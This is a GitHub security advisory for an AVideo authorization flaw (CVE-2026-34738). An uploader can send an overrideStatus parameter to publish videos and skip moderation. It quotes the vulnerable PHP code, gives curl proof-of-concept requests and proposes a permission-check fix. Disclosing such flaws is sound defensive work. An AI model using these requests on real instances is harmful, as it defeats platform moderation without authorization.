# [M] AVideo: Video Publishing Workflow Bypass via Unauthorized overrideStatus Request Parameter

## Summary
Severity: Medium
Advisory: GHSA-m577-w9j8-ch7j
CVE: CVE-2026-34738
CWE: CWE-285
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-m577-w9j8-ch7j
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

AVideo's video processing pipeline accepts an `overrideStatus` request parameter that allows any uploader to set a video's status to any valid state, including "active" (`a`). This bypasses the admin-controlled moderation and draft workflows. The `setStatus()` method validates the status code against a list of known values but does not verify that the caller has permission to set that particular status. As a result, any user with upload permissions can publish videos directly, circumventing content review processes.

## Details

At `objects/video.php:1055-1056`, the video object checks for an `overrideStatus` parameter in the request and applies it directly:

```php
if (!empty($_REQUEST['overrideStatus'])) {
    return $this->setStatus($_REQUEST['overrideStatus']);
}
```

This code is reached from two entry points:
- `objects/videoAddNew.json.php:157` - when adding a new video
- `objects/aVideoEncoder.json.php:114` - when processing an encoded video

The `setStatus()` method validates that the provided status code is one of the recognized values (`a`, `k`, `i`, `h`, `e`, `x`, `d`, `t`, `u`, `s`, `r`, `f`, `b`, `p`, `c`) but does not perform any authorization check. It does not verify whether the calling user has permission to set a video to the requested status.

The relevant status codes include:
- `a` - Active (published and publicly visible)
- `k` - Draft (pending review)
- `i` - Inactive
- `e` - Encoding
- `x` - Deleted
- `u` - Unlisted

When an admin configures the platform to require moderation (new videos default to draft/pending status), any uploader can bypass this by including `overrideStatus=a` in their upload request.

## Proof of Concept

1. Assume the AVideo instance has moderation enabled (new videos default to draft status `k`).

2. Upload a video as a regular user, including the `overrideStatus` parameter:

```bash
curl -b "PHPSESSID=USER_SESSION" \
  -X POST "https://your-avideo-instance.com/objects/videoAddNew.json.php" \
  -F "title=Bypassed Moderation" \
  -F "description=This video skips the review queue" \
  -F "videoLink=https://example.com/video.mp4" \
  -F "overrideStatus=a"
```

3. The video is immediately set to active status and is publicly visible, bypassing the admin moderation workflow.

4. Verify the video is publicly accessible:

```bash
curl -s "https://your-avideo-instance.com/video/VIDEO_CLEAN_TITLE" | grep -o "<title>.*</title>"
```

5. An uploader can also use this to set other statuses:

```bash
# Set a video to "unlisted" even if the platform restricts this
curl -b "PHPSESSID=USER_SESSION" \
  -X POST "https://your-avideo-instance.com/objects/videoAddNew.json.php" \
  -F "title=Unlisted Video" \
  -F "videoLink=https://example.com/video.mp4" \
  -F "overrideStatus=u"
```

## Impact

Any user with upload permissions can bypass content moderation by setting videos directly to active status. This undermines the platform's ability to enforce content policies, review uploads before publication, or maintain a moderation queue. On platforms that rely on moderation for legal compliance (e.g., DMCA, age-gated content), this bypass could have regulatory consequences. The same mechanism also allows uploaders to set arbitrary statuses like "unlisted" or "inactive" on their own videos, bypassing platform-level restrictions on these features.

- **CWE-285**: Improper Authorization
- **Severity**: Medium

## Recommended Fix

Add an authorization check before applying the `overrideStatus` parameter at `objects/video.php:1055`:

```php
// objects/video.php:1055
if (!empty($_REQUEST['overrideStatus']) && (User::isAdmin() || Permissions::canAdminVideos())) {
    return $this->setStatus($_REQUEST['overrideStatus']);
}
```

This ensures that only administrators or users with video management permissions can override the video publishing status. Regular uploaders will follow the normal moderation workflow.

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-m577-w9j8-ch7j
- https://nvd.nist.gov/vuln/detail/CVE-2026-34738
- https://github.com/WWBN/AVideo/commit/34f0237e2449d2e564a69fe3c5c71c830f5d11fd
- https://github.com/WWBN/AVideo
